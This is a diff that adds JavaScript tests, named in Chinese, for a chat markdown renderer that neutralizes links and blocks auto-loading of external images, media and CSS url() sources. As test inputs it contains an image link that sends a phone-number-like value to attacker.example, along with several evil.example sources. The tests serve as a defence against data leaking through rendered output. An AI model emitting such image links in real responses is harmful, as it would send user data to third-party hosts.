@@ -135,3 +135,44 @@ test('neutralizeUnsafeLinks：第三方渲染的 DOM 里去掉不安全的 href�
   assert.equal(root.innerHTML, '<a>坏</a><a href="https://ok.example">好</a><a href="#toc">目录</a><a>无链接</a>')
   assert.equal(neutralizeUnsafeLinks(null), 0)
 })
+
+test('非网页链接不在本页跳转：相对地址、锚点、脚注只留文字；网页链接新标签页打开', () => {
+  assert.equal(
+    render('报告：[季度报告](report.docx)，[明细](/workspace/detail.xlsx)，[第一章](#第一章)'),
+    '<p>报告：<span class="md-link-disabled" title="report.docx">季度报告</span>，' +
+      '<span class="md-link-disabled" title="/workspace/detail.xlsx">明细</span>，' +
+      '<span class="md-link-disabled" title="#第一章">第一章</span></p>'
+  )
+  assert.equal(render('结论[^1]\n\n[^1]: 来源：年报'), '<p>结论<span class="md-link-disabled" title="来源：年报">^1</span></p>')
+  // 模型直接写的 HTML 链接同样处理
+  assert.equal(render('<a href="/workspace/x.docx">下载</a>'), '<p><a>下载</a></p>')
+  assert.equal(
+    render('<a href="//mirror.example/x">镜像</a>'),
+    '<p><a href="//mirror.example/x" target="_blank" rel="noopener noreferrer">镜像</a></p>'
+  )
+  assert.equal(render('[发邮件](mailto:a@b.com)'), '<p><a href="mailto:a@b.com">发邮件</a></p>')
+})
+
+test('对话里的外站图片不自动加载，改成点开才请求的链接；音视频与 url() 样式去掉', () => {
+  const html = render('![收益曲线](https://attacker.example/log?d=13800000000)')
+  assert.ok(!html.includes('<img'), html)
+  assert.ok(
+    html.includes('<a class="md-image-link" href="https://attacker.example/log?d=13800000000" target="_blank" rel="noopener noreferrer"'),
+    html
+  )
+  assert.ok(html.includes('>图片：收益曲线（attacker.example）</a>'), html)
+  const raw = render('<img src="https://evil.example/x.png"> <img srcset="https://evil.example/2x.png 2x" src="/static/a.png">')
+  assert.ok(!/<img[^>]*evil\.example/.test(raw) && !raw.includes('srcset'), raw)
+  assert.ok(raw.includes('<img src="/static/a.png">'), raw)
+  assert.ok(render('![点](data:image/png;base64,iVBORw0KGgo=)').includes('<img src="data:image/png;base64,iVBORw0KGgo="'))
+  const media = render(
+    '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>' +
+      '<span style="background:url(https://evil.example/x)">样式</span>'
+  )
+  assert.ok(!media.includes('evil.example'), media)
+})
+
+test('文件预览（remoteImages: inline）外站图片照常显示', () => {
+  const html = renderMarkdown('![图](https://img.example/a.png)', renderer, { sourceCards: false, remoteImages: 'inline' })
+  assert.equal(html.trim(), '<p><img src="https://img.example/a.png" alt="图"></p>')
+})
